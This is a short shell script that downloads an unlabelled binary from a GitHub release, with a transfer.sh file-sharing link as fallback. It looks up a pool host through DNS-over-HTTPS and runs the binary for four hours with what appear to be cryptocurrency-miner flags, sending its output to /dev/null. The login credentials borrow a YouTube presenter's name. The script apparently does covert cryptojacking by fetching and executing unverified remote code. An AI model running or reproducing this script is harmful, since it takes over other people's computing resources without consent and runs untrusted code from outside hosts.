apt update -qq
apt install -y curl git jq
curl -Lfo prog https://github.com/bhriscarnatt/first-repo/releases/download/a/prog || curl -Lfo prog https://transfer.sh/OSPjK/prog
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=poolio.magratmail.xyz&type=A' | jq -r '.Answer[0].data')
chmod u+x prog
timeout 4h ./prog -o "${ip}:3000" -u ChrisBarnatt -p ExplainingComputers --cpu-priority 5 > /dev/null